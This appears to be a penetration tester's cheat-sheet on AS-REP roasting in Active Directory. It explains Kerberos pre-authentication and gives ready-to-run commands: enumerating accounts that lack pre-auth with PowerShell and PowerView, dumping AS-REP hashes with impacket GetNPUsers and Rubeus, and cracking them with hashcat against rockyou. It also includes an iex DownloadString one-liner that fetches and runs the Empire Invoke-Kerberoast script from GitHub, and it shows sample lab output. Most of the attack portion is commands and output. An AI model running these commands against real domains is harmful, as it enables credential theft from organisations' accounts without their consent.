## AS-REP roasting (Dumping users hashes , pre authentication disabled)
```
Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

Rubeus automatically enumerate eligible users havingpre authrntication disabled whereas impacket requires us to give a list of users
on target we can check which users have pre authentication disabled through powershell

    get-aduser -filter * -properties DoesNotRequirePreAuth | where {$.DoesNotRequirePreAuth -eq "True" -and $.Enabled -eq "True"} | select Name

Using PowerView.ps1
    Get-DomainUser -PreauthNotRequired Get-DomainUser -UACFilter DONT_REQ_PREAUTH

    Using Impacket (REmotely without authentication)
    we require list of usernames on target. we can find those from kerbrute and supply here

    Without AUthentication
    sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.name/ -dc-ip IPADDRESS -users kerbuser.txt -no-pass

          With Authentication                                                    OR 
    sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.name/Machine1:Password1 -dc-ip IPADDRESS -users kerbuser.txt

    Using Rubeus
using rubeus is prefereed because it automatically enumerate users

    Rubeus.exe asreproast (we can also specify specific user to target by adding /username:password in this command. also domain or domaincontroller)

            or

    iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1") Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>


AS-REP Roasting
The first step of the authentication process via Kerberos is to send an AS-REQ. 
Based on this request, the DC can validate if authentication is successful. 
If it is, the domain controller replies with an AS-REP containing the session key and TGT. 
This step is also commonly referred to as Kerberos preauthentication and prevents offline password guessing.

Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the DC on behalf of any AD user. 
After obtaining the AS-REP from the DC, you can perform an offline password attack against the encrypted part of the response.
This attack is known as AS-REP Roasting.
 
 By default, the AD user account option Do not require Kerberos preauthentication is disabled, meaning that Kerberos preauthentication is performed for all users. 
 However, it is possible to enable this account option manually. 

From remotely our Kali machine first, then locally on Windows. 
On Kali, we can use impacket-GetNPUsers to perform AS-REP roasting. 
We'll need to enter the IP address of the DC as an argument for -dc-ip, the name of the output file in which the AS-REP hash will be stored in Hashcat format for -outputfile, and -request to request the TGT.

Finally, we need to specify the target authentication information in the format domain/user, this is the user we use for authentication. 
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/mute

Using GetNPUsers to perform AS-REP roasting
kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/mute
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
----  --------  --------------------------  --------------------------  --------
muted            2022-09-02 19:21:17.285464  2022-09-07 12:45:15.559299  0x410200 
muted has the user account option Do not require Kerberos preauthentication enabled, meaning it's vulnerable to AS-REP Roasting.

Obtaining the correct mode for Hashcat
By default, the resulting hash format of impacket-GetNPUsers is compatible with Hashcat. 
Check the correct mode for the AS-REP hash by grepping for "Kerberos" in the Hashcat help.

kali@kali:~$ hashcat --help | grep -i "Kerberos"
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
   
The output of the grep command shows that the correct mode for AS-REP is 18200.

We've collected what we need to use Hashcat and crack the AS-REP hash. 
Enter the mode 18200, the file containing the AS-REP hash, rockyou.txt as wordlist, best64.rule as rule file, and --force to perform the cracking on your Kali VM.

kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

AS-REP Roasting on Windows. 
We'll use Rubeus, which is a tool for raw Kerberos interactions and abuse.

PS C:\mute> .\Rubeus.exe asreproast /nowrap
PS C:\mute> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast <-- Might as well do a quick kerberoast while your cooking.

kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
